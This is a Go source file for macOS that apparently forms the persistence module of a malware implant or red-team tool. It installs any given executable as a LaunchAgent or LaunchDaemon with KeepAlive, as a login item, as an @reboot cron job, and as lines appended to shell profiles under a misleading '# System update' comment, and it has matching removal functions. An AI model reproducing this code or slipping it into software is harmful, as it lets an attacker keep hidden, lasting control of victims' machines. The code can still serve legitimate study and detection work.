// +build darwin

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// PersistenceDarwin provides persistence mechanisms for macOS
type PersistenceDarwin struct{}

func NewPersistence() *PersistenceDarwin {
	return &PersistenceDarwin{}
}

// LaunchAgent creates a LaunchAgent for persistence (user level)
func (p *PersistenceDarwin) LaunchAgent(name, exePath string) error {
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/%s.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/%s.err</string>
</dict>
</plist>
`, name, exePath, name, name)

	plistPath := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents", name+".plist")
	os.MkdirAll(filepath.Dir(plistPath), 0755)

	err := os.WriteFile(plistPath, []byte(plistContent), 0644)
	if err != nil {
		return err
	}

	// Load the launch agent
	exec.Command("launchctl", "load", plistPath).Run()
	return nil
}

// RemoveLaunchAgent removes a LaunchAgent
func (p *PersistenceDarwin) RemoveLaunchAgent(name string) error {
	plistPath := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents", name+".plist")

	// Unload first
	exec.Command("launchctl", "unload", plistPath).Run()

	return os.Remove(plistPath)
}

// LaunchDaemon creates a LaunchDaemon for persistence (root level)
func (p *PersistenceDarwin) LaunchDaemon(name, exePath string) error {
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
`, name, exePath)

	plistPath := "/Library/LaunchDaemons/" + name + ".plist"

	err := os.WriteFile(plistPath, []byte(plistContent), 0644)
	if err != nil {
		return err
	}

	exec.Command("launchctl", "load", plistPath).Run()
	return nil
}

// RemoveLaunchDaemon removes a LaunchDaemon
func (p *PersistenceDarwin) RemoveLaunchDaemon(name string) error {
	plistPath := "/Library/LaunchDaemons/" + name + ".plist"
	exec.Command("launchctl", "unload", plistPath).Run()
	return os.Remove(plistPath)
}

// LoginItem adds a login item (requires osascript)
func (p *PersistenceDarwin) LoginItem(appPath string) error {
	script := fmt.Sprintf(`tell application "System Events" to make login item at end with properties {path:"%s", hidden:false}`, appPath)
	cmd := exec.Command("osascript", "-e", script)
	return cmd.Run()
}

// RemoveLoginItem removes a login item
func (p *PersistenceDarwin) RemoveLoginItem(name string) error {
	script := fmt.Sprintf(`tell application "System Events" to delete login item "%s"`, name)
	cmd := exec.Command("osascript", "-e", script)
	return cmd.Run()
}

// CronJob adds a cron job for persistence
func (p *PersistenceDarwin) CronJob(command string) error {
	cronEntry := fmt.Sprintf("@reboot %s\n", command)

	currentCrontab, _ := exec.Command("crontab", "-l").Output()
	newCrontab := string(currentCrontab) + cronEntry

	cmd := exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCrontab)
	return cmd.Run()
}

// RemoveCronJob removes a cron job
func (p *PersistenceDarwin) RemoveCronJob(command string) error {
	currentCrontab, _ := exec.Command("crontab", "-l").Output()

	lines := strings.Split(string(currentCrontab), "\n")
	var newLines []string

	for _, line := range lines {
		if !strings.Contains(line, command) {
			newLines = append(newLines, line)
		}
	}

	newCrontab := strings.Join(newLines, "\n")
	cmd := exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCrontab)
	return cmd.Run()
}

// Profile adds to shell profile
func (p *PersistenceDarwin) Profile(command string) error {
	// Try both .zshrc and .bash_profile
	profiles := []string{
		filepath.Join(os.Getenv("HOME"), ".zshrc"),
		filepath.Join(os.Getenv("HOME"), ".bash_profile"),
		filepath.Join(os.Getenv("HOME"), ".profile"),
	}

	for _, profilePath := range profiles {
		if _, err := os.Stat(profilePath); err != nil {
			continue
		}

		content, _ := os.ReadFile(profilePath)
		if strings.Contains(string(content), command) {
			continue
		}

		f, err := os.OpenFile(profilePath, os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			continue
		}

		f.WriteString("\n# System update\n" + command + "\n")
		f.Close()
	}

	return nil
}

// RemoveProfile removes from shell profile
func (p *PersistenceDarwin) RemoveProfile(command string) error {
	profiles := []string{
		filepath.Join(os.Getenv("HOME"), ".zshrc"),
		filepath.Join(os.Getenv("HOME"), ".bash_profile"),
		filepath.Join(os.Getenv("HOME"), ".profile"),
	}

	for _, profilePath := range profiles {
		if _, err := os.Stat(profilePath); err != nil {
			continue
		}

		content, err := os.ReadFile(profilePath)
		if err != nil {
			continue
		}

		lines := strings.Split(string(content), "\n")
		var newLines []string

		for _, line := range lines {
			if !strings.Contains(line, command) && !strings.Contains(line, "# System update") {
				newLines = append(newLines, line)
			}
		}

		os.WriteFile(profilePath, []byte(strings.Join(newLines, "\n")), 0644)
	}

	return nil
}
